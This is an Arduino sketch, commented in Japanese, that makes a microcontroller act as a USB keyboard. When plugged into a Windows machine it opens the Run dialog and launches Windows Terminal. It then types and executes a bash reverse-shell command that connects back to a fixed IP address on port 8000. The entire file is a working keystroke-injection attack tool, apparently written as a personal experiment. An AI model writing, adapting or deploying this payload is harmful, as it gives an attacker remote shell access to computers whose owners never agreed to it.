#include "Keyboard.h"

void typeKeyboard(char key) {
  Keyboard.press(key);
  delay(100);
  Keyboard.release(key);
}

void startTerminal() {
  // Win + r ファイル名を指定して実行
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(1000);
  Keyboard.releaseAll();

  // wt.exe Windows Terminal
  Keyboard.println("wt.exe");
  delay(1000);
}

void startReverseShell() {
  // この入力だけではコマンドの実行がされない
  Keyboard.println("bash -c \"bash -i >& /dev/tcp/172.31.228.112/8000 0>&1\"");
  
  // Windows Terminal の新しいウィンドウでは
  // 直接入力でなく、半角英数になっているので
  // 入力の確定+コマンドの実行の計2回のEnterが必要
  typeKeyboard(KEY_RETURN);
  delay(1000);
}

void setup() {
  Keyboard.begin();
  delay(1000);
  startTerminal();
  startReverseShell();
  Keyboard.end();
}

void loop() {}
